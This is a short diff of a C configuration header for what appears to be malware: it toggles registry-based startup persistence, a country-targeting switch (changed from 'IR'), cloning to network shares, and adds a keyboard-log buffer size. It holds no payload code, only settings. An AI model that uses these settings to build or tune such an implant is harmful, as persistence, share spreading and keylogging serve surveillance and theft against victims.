@@ -9,12 +9,13 @@
 
 #define INSTALL_PATH "<WINDRIVE><APPNAME>/<APPNAME>.exe"
 
-#define START_UP true
+//start up
+#define START_UP false
 #define START_UP_METHOD 1 //1 = registery 2 = dir
 
 //just run on this country
-#define LOCATION_DETECTOR true
-#define LOCATION_DETECTOR_COUNTRY "IR"
+#define LOCATION_DETECTOR false
+#define LOCATION_DETECTOR_COUNTRY "EN"
 
 #define CLONE_SHARE true
 
@@ -25,3 +26,5 @@
 #define MAX_USERNAME_SIZE 256
 
 #define PROCESS_OUTPUT_BUFF_SIZE 1024
+
+#define KEYBOARD_LOG_SIZE 1
